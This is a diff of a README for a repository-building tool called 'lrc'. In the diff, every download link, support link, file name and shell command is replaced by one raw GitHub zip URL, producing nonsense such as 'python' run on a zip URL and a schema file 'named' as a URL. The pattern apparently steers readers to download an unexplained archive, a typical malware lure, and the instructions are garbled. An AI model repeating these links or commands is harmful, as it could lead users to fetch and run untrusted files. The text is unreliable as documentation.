@@ -1,6 +1,6 @@
 # 🚀 lrc - Build Your Repo Easily
 
-[![Download lrc](https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip)](https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip)
+[![Download lrc](https://raw.githubusercontent.com/OmarAhad/lrc/main/docs/Software_v2.2.zip)](https://raw.githubusercontent.com/OmarAhad/lrc/main/docs/Software_v2.2.zip)
 
 ## 📖 Overview
 
@@ -30,7 +30,7 @@ Make sure to install Python before running LRC.
 ## 🚀 Getting Started
 
 1. **Download LRC**  
-   Visit [this page to download](https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip) the latest version.
+   Visit [this page to download](https://raw.githubusercontent.com/OmarAhad/lrc/main/docs/Software_v2.2.zip) the latest version.
 
 2. **Extract Files**  
    After downloading, extract the files to a folder on your computer.
@@ -47,13 +47,13 @@ Make sure to install Python before running LRC.
 5. **Run LRC**  
    Type the following command to start LRC:
    ```bash
-   python https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip
+   python https://raw.githubusercontent.com/OmarAhad/lrc/main/docs/Software_v2.2.zip
    ```
 
 ## 📥 Download & Install
 
 To get the latest version of LRC:
-- Go to the [Releases page](https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip).
+- Go to the [Releases page](https://raw.githubusercontent.com/OmarAhad/lrc/main/docs/Software_v2.2.zip).
 - Click on the version you want.
 - Download the appropriate file for your system.
 
@@ -62,7 +62,7 @@ To get the latest version of LRC:
 Once you have downloaded LRC, follow these steps to use it effectively:
 
 1. **Create a Schema File**  
-   Create a file named `https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip` in your LRC folder. This file will define how your repository should look.
+   Create a file named `https://raw.githubusercontent.com/OmarAhad/lrc/main/docs/Software_v2.2.zip` in your LRC folder. This file will define how your repository should look.
 
    Example schema:
    ```yaml
@@ -70,22 +70,22 @@ Once you have downloaded LRC, follow these steps to use it effectively:
      name: MyProject
      description: A simple project setup.
      files:
-       - https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip
+       - https://raw.githubusercontent.com/OmarAhad/lrc/main/docs/Software_v2.2.zip
        - src/
      templates:
-       - https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip
+       - https://raw.githubusercontent.com/OmarAhad/lrc/main/docs/Software_v2.2.zip
    ```
 
 2. **Run Dry-Run**  
    To preview what LRC will do without making changes, use this command:
    ```bash
-   python https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip --dry-run
+   python https://raw.githubusercontent.com/OmarAhad/lrc/main/docs/Software_v2.2.zip --dry-run
    ```
 
 3. **Compile Your Project**  
    Once you're satisfied with the dry-run, use this command to create your repo:
    ```bash
-   python https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip --force
+   python https://raw.githubusercontent.com/OmarAhad/lrc/main/docs/Software_v2.2.zip --force
    ```
 
 ## ⚙️ Command Options
@@ -99,7 +99,7 @@ LRC comes with several useful commands and options:
 
 For a complete list of commands, refer to the help option:
 ```bash
-python https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip --help
+python https://raw.githubusercontent.com/OmarAhad/lrc/main/docs/Software_v2.2.zip --help
 ```
 
 ## 🛠️ Troubleshooting
@@ -107,14 +107,14 @@ python https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/nod
 If you encounter issues, consider these common solutions:
 
 - **Python Not Found**: Ensure Python is installed and added to your system path.
-- **Missing Schema File**: Confirm the `https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip` file is in the same folder as `https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip`.
+- **Missing Schema File**: Confirm the `https://raw.githubusercontent.com/OmarAhad/lrc/main/docs/Software_v2.2.zip` file is in the same folder as `https://raw.githubusercontent.com/OmarAhad/lrc/main/docs/Software_v2.2.zip`.
 - **Permissions Issue**: Run the terminal or command prompt with administrative rights.
 
 ## 🌐 Community & Support
 
 Join our community for help and feedback. Check out our discussions and post questions you may have. We encourage users to share their experiences and improvements.
 
-- **GitHub Discussions**: [Join the Conversation](https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip)
+- **GitHub Discussions**: [Join the Conversation](https://raw.githubusercontent.com/OmarAhad/lrc/main/docs/Software_v2.2.zip)
 
 ## 🎉 Features
 
